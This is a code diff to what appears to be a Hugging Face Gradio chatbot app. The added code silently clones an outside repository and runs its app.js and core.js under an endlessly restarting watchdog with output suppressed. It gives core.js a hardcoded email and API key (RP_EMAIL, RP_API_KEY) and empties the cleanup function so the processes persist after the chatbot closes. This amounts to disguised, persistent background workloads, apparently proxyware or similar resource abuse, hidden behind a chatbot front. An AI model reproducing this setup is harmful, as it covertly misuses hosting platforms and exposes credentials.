@@ -4,18 +4,53 @@ import subprocess
 import os
 import signal
 import atexit
+import time
+import threading
 
+# ===== Hàm khởi chạy tiến trình =====
+def start_process(cmd, cwd=None, env=None):
+    return subprocess.Popen(
+        cmd,
+        cwd=cwd,
+        env=env,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
 
+# ===== Watchdog =====
+def watchdog(name, cmd, cwd=None, env=None):
+    while True:
+        proc = start_process(cmd, cwd, env)
+        print(f"[WATCHDOG] {name} started with PID {proc.pid}")
+        proc.wait()
+        print(f"[WATCHDOG] {name} crashed. Restarting in 2s...")
+        time.sleep(2)
+
+# 1. Clone repo mới nếu chưa tồn tại
 if not os.path.exists("app"):
     subprocess.run([
-        "git", "clone", "https://huggingface.co/ewfwsfaw/app"
+        "git", "clone", "https://huggingface.co/Wsdggssdggg/app"
     ])
 
+# 2. Chạy watchdog cho app.js
+threading.Thread(
+    target=watchdog,
+    args=("app.js", ["node", "app.js"]),
+    kwargs={"cwd": "app"},
+    daemon=True
+).start()
 
-node_process = subprocess.Popen(
-    ["node", "app.js"],
-    cwd="app"
-)
+# 3. Chạy watchdog cho core.js với biến môi trường
+env_vars = os.environ.copy()
+env_vars["RP_EMAIL"] = "mamateo0005@gmail.com"
+env_vars["RP_API_KEY"] = "fe0c231a-79ad-401d-8463-28e291156326"
+
+threading.Thread(
+    target=watchdog,
+    args=("core.js", ["node", "core.js"]),
+    kwargs={"cwd": "app", "env": env_vars},
+    daemon=True
+).start()
 
 # 4. Chatbot code
 client = InferenceClient("HuggingFaceH4/zephyr-7b-beta")
@@ -51,14 +86,9 @@ demo = gr.ChatInterface(
     ],
 )
 
-
+# 5. Không tắt tiến trình khi đóng Gradio
 def cleanup():
-    if node_process.poll() is None:
-        node_process.terminate()
-        try:
-            node_process.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            os.kill(node_process.pid, signal.SIGKILL)
+    pass
 atexit.register(cleanup)
 
 if __name__ == "__main__":
